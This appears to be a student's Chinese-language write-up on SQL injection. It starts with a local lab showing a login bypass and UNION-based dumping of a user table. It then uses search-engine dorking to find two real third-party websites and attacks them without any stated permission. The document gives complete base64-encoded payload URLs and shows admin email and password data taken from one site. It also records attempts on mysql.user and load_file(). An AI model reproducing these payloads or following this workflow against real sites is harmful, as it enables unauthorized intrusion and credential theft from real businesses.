### 了解SQL注入
定义
> SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。

原理
> 造成SQL注入的原因是因为程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。
从本质上来说，SQL注入和XSS注入很相似，都是因为没有做好对用户的输入控制而导致的错误。

### 环境准备
俗话说的好，光说不练假把式，本次作业我就简单地模拟SQL注入。

* 安装PostgresSQL 和 Mysql:
```
sudo apt-get update
sudo apt-get install postgresql pgadmin3
sudo pg_createcluster -p 5432 -u postgres 9.3 virusTest --start
sudo netstat -aWn --programs | grep postgres
```

* 安装Mysql
```
sudo apt-get update
sudo apt-get install mysql-server
```

* 创建数据库
```
sudo su
su postgres
psql
create database virustest
```

* 在Ubuntu上安装NodeJs
```
wget -t https://nodejs.org/dist/v6.9.1/node-v6.9.1-linux-x64.tar.xz
tar -xf node-v6.9.1-linux-x64.tar.xz
cd node-v6.9.1-linux-x64.tar.xz/bin
ln -s *****  /usr/local/bin/node
ln -s *****  /usr/local/bin/npm
```

### 经典注入：' or 1=1#
#### 准备工作
* 编写```models/index.js```、```models/migrate.js```、```models/User.js```创建如下图所示的User表：

<div align=center>
User表

account | password
---|---
test0 | 1234560
test1 | 1234561
test2 | 1234562
</div>

* 执行```node models/migrate```初始化数据库
* 编写 ```first/index.js``` 定义简单的服务器
* 编写 ```views/index.html``` 定义简单的登录页面
* 安装所有依赖```npm install```

#### 实践
数据库初始化完成后，我们来开心的模拟一次经典的登录注入操作 ：使用```' or 1=1#```绕过用户名和密码验证直接登录。

* 启动服务器 ```node first/index.js```，访问```http://localhost:5000/```看到如下网页
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/first/first3.png"/>
</div>

* 输入 account : ```test0```, password : ```1234560```，可以发现登录成功

* 输入 account : ```test0```, password : ```wrongPassword```，可以发现登录失败

* 输入 account : ```' or 1=1#``` , password : ```test```，可以发现登录成功！！！

我们来看看后台代码中对用户输入的用户名和密码进行验证的的SQL语句： 
```sql
`select * from Users where account ='${account}' and password='${password}'`
```
我们将account：```' or 1=1#```，password：```test``` 的值带入，这条语句变成了： 
```sql
select * from users where account = '' or 1=1 #' and password='test'
```
可以看到：
* SQL的Where子句就变成了永真，因为```account='' or 1 = 1```永远成立。
* ```#```后面的语句全部变成了注释（mysql可以用#号来注释代码），不会影响代码正确运行，服务器不会返回500。

这个注入能够成功的原因就在于——灵活使用```'```字符和```#```字符。


### Union子句的妙用
#### 准备工作
* 编写models/Article和models/migrate.js定义如下图所示的Articles表：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second1.png" height = "auto" alt="图片名称" align=center />
</div> 
* 执行```node models/migrate```初始化数据库
* 编写路由代码：
```javascript
router.get("/article",function *(){
    var ctx = this;
    var query = ctx.request.query;
    var articleId = query.id || 1;
    debug("SQL",`select * from Articles where id = ${articleId}`);
    var data = yield db.query(`select * from Articles where id = ${articleId}`,{
        type: db.QueryTypes.SELECT
    });
    data = data.length !== 0 ? data[data.length - 1] : {
        title : "没有这个文章",
        content :"<p>没有这个文章</p>"
    };
    // debug(data);
    yield ctx.render("index.html", data);
})
```
此路由函数会先接收GET参数传来的id，使用SQL对id进行查询，将查询到的数据渲染到html返回给浏览器端。

* 启动服务器 ```node first/index.js```，访问```http://localhost:3030/article?id=1```，可以看到如下图所示的界面：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second2.png" height = "auto" alt="图片名称" align=center />
</div> 

#### 实践
* 访问 ```http://localhost:3030/article？id=3/*ABC*/```，可以发现返回的页面没有变化，这说明后台对输入没有过滤，这里是可以注入的。
* 确认页面可以注入后，访问```http://localhost:3030/article?id=3 and 1=2```，可以发现页面显示没有文章，因为1=2的判断导致SQL的Where子句永远为false，所以没有文章返回。
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second3.png" height = "auto" alt="图片名称" align=center />
</div> 
* 使用union子句得到当前文章所在表的列数，从1开始测，依次访问以下网址
```
http://localhost:3030/article?id=3 and 1=1 union select 1
http://localhost:3030/article?id=3 and 1=1 union select 1,2  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5  
```
前四步都显示：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second4.png" height = "auto" alt="图片名称" align=center />
</div> 
这是因为union两头连接的表的字段数不一致，所以SQL语句执行结果是错误的。而访问```http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5```成功，这是因为Articles表的列数就是5，访问这样的网址，后台实际执行的SQL语句及其结果如下图所示：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second5.png" height = "auto" alt="图片名称" align=center />
</div> 

* 访问```http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5```，我们发现页面展示的还是id=3的文章，查看路由处理的代码：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second6.png" height = "auto" alt="图片名称" align=center />
</div> 
可以发现，默认返回的是第一条数据，所以我们加一个order by id DESC就可以看到别的数据了：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,2,3,4,5 order by id DESC  
```
访问上述网址，后台执行的SQL语句及其结果如下图所示
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second7.png" height = "auto" alt="图片名称" align=center />
</div> 

所以页面的返回结果是：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second8.png" height = "auto" alt="图片名称" align=center />
</div> 

我们可以看到我们传给后端的2，3分别在这里被展示在了页面上。

* 首先，我们要知道数据库的版本和数据表的名称，访问以下网址：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,version(),database(),4,5 order by id DESC  
```
我们就可以看到数据库的版本和数据表的名称：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second9.png" height = "auto" alt="图片名称" align=center />
</div> 
这里记下virustest这个数据库的名称。

* 知道了数据库的名称后，尝试得到我们所需要的表的名称，将访问的网址改成：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,2,TABLE_NAME,4,5 FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=virustest order by rand() DESC  
```
其中的```order by rand()```可以帮助我们随机地看到数据库中有哪些表，我们多访问几次，就可以看到有一个Users表：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second10.png" height = "auto" alt="图片名称" align=center />
</div> 
这个Users表就非常有用，我们来继续注入，尝试着拿到用户名和密码。

* 知道了数据表的名称后，就可以尝试着得到表中列的名称，将访问网址改成：
```
http://localhost:3030/article?id=3 and 1=1 union SELECT 10000,COLUMN_NAME,3,4,5 FROM information_schema.columns where TABLE_SCHEMA='virustest' and TABLE_NAME='Users' order by rand()
```
由于有```order by rand()```，多访问几次，我们就可以陆续看到所有的列名，有两个字段我们比较感兴趣：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second11.png" height = "auto" alt="图片名称" align=center />
</div> 
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second12.png" height = "auto" alt="图片名称" align=center />
</div> 
记住“account”字段和“password”字段

* 知道了数据表的列名后，就可以开始拖库了，访问以下网址：
```
http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 from Users order by rand() DESC
```
访问结果如下图所示：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second13.png" height = "auto" alt="图片名称" align=center />
</div> 
不断访问这个网址，就可以陆续看到数据库中的所有用户名和密码。

### 实战
#### 搜索引擎的使用
使用Google搜索```inurl:.php?id=MTM=```，这里inurl指的是在url内有后面字符串的网站，后面的id=MTM=是指base64加密后的id=13，表明网站对URL进行了base64处理。Google查询出来结果如下：
<div align=center>
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third1.png" />
</div>

我自己经过删选测试，选取了两个网站：
- [http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSx2ZXJzaW9uKCksZGF0YWJhc2UoKSw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCwxNQ==](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSx2ZXJzaW9uKCksZGF0YWJhc2UoKSw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCwxNQ==)
- [http://www.zaaffran.com/testimonials.php?id=MTM=](http://www.zaaffran.com/testimonials.php?id=MTM=) 一家印度餐厅主页

本次就对这两个网站进行破解，先回顾一下我们上次自己研究的几个破解步骤：
- 测试能否被注入
- 通过union测表段数目
- 通过mysql函数得到数据库的名称
- 通过INFORMATION_SCHEMA查询表的名称和表内行的名称
- 获取想要的数据

***我们借助[http://www1.tc711.com/tool/BASE64.htm](http://www1.tc711.com/tool/BASE64.htm)这个base64工具进行base64加解密***

#### 第一个网站的SQL注入
* 测试是否能被注入，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==)，base64串的含义是```id=13 and 1=2```，返回的结果如下图，表明是此网站可以注入的
<div align=center> 
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third2.png" />
</div>
* 通过union测表的列数，我们从1到30挨个测，最后测试出来表的列数是15，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=)，base64串的含义是```id=13 and 1=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15```，结果如下图所示，可以看到有页面有九个显示位，显示位很多，就不需要concat()函数将多条数据拼接到一起了
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third3.png" />
</div>
* 通过mysql函数得到数据库的名称，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1)，base64串的含义是```id=13 and 1=1 union select 1,database(),3,4,5,6,7,8,9,10,version(),12,13,14,15```，我们可以看到如下图的结果，表明数据库的名称是csearch，版本是4.0.25
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third4.png" />
</div>
* 通过INFORMATION_SCHEMA查询表的名称和表内行的名称，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg)，base64串的含义是```id=13 and 1=1 union select 1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15 from information_shcema```，结果竟然是没有权限！！！
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third5.png" />
</div>
进行到这里，发现这个数据库用户没有足够的权限，我决定放弃，盲注猜表名和错误回显法的耗时较长，同时这个网站应该主要是用来搜索，我尝试了没有找到users表和admins表就放弃了。

#### 第二个网站的SQL注入
* 测试能否被注入，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9Mg==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9Mg==)，base64串的含义是```id=13 and 1=2```，结果如下，可以发现页面没有显示，证明是可以注入的
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third9.png" />
</div>

* 通过union测表的列数，从1到30挨个测试，最后得知列数是7，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==)，结果如下图所示，可以看到有三个显示位
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third10.png" />
</div>

* 通过mysql函数得到数据库的名称，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHZlcnNpb24oKSw0LDUsNiw3](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHZlcnNpb24oKSw0LDUsNiw3)，base64串的含义是```id=14 and 1=2 union select 1,database(),version(),4,5,6,7```，访问结果如下图，得到数据库的名称是zaaffran_zaaffran，数据库版本是5.5.2
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third11.png" />
</div>

* 通过INFORMATION_SCHEMA查询表的名称和表内行的名称,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM=](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM=)，base64串的含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables```，可以看到五个数据表：
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third12.png" />
</div>

* 由于这里只显示了五张表，而且都是系统自带的表，对我来说没有什么用处，于是尝试了使用order by table_type，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgdGFibGVfdHlwZQ==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgdGFibGVfdHlwZQ==)，base64串的含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables order by table_type```
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third13.png" />
</div>
可以发现网页报错，我判断系统后面加入了```limit 5```这个子句，由于SQL语法不允许```order by```子句在```limit```子句前面，所以网站发生了错误。

* 访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgMSM=](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgMSM=)，base64串含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables order by 1#```，这次显示结果如下，成功了！
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third14.png" />
</div>

* 同时我们搜索到了adminusers表这个敏感的表，我决定对这个表进行查询，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGNvbHVtbl9uYW1lLDQsNSw2LDcgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdhZG1pbnVzZXJzJyBvcmRlciBieSAxIw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGNvbHVtbl9uYW1lLDQsNSw2LDcgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdhZG1pbnVzZXJzJyBvcmRlciBieSAxIw==)，base64含义是```14 and 1=2 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='adminusers' order by 1#```，可以看到如下图所有的表段
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third15.png" />
</div>

* 获取想要的数据,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLFVzZXJFbWFpbCxVc2VyUGFzc3dvcmQsNSw2LDcgZnJvbSBhZG1pbnVzZXJzIw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLFVzZXJFbWFpbCxVc2VyUGFzc3dvcmQsNSw2LDcgZnJvbSBhZG1pbnVzZXJzIw==)，base64串含义是```14 and 1=2 union select 1,2,UserEmail,UserPassword,5,6,7 from adminusers#```,可以看到adminusers表里面的所有数据
<div align=center>
  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third16.png" />
</div>

### 总结
我们进行了两次对互联网网站的SQL注入，第一次不是很成功，第三次好歹是拿到数据了，尝试了一下扩大战果，```select user,password from mysql.user```，失败= - =，估计是没有权限。select hex(load_file())的方法也是失败，毕竟mysql版本是5.5，安全级别较高，想要load_file()还是很难的。

通过以上的实践，我们可以总结出一些防范SQL注入的方法：
* 限制权限，单独搞一个数据库和用户暴露给外界，把查询的范围和权限限制死，你就算可以注入也然并卵，数据没有用啊！
* 直接过滤掉union或者select，不允许传的参数里面带有这个（360的做法）

在Restful API的时代，开发者在开发一个项目的时经常用到类似于id=?或者title=?这样的GET参数查询，后端通信可能会有很多这样的漏洞，而这样的漏洞造成的后果往往是灾难性的。开发者尤其是后端开发者一定要注意哦！
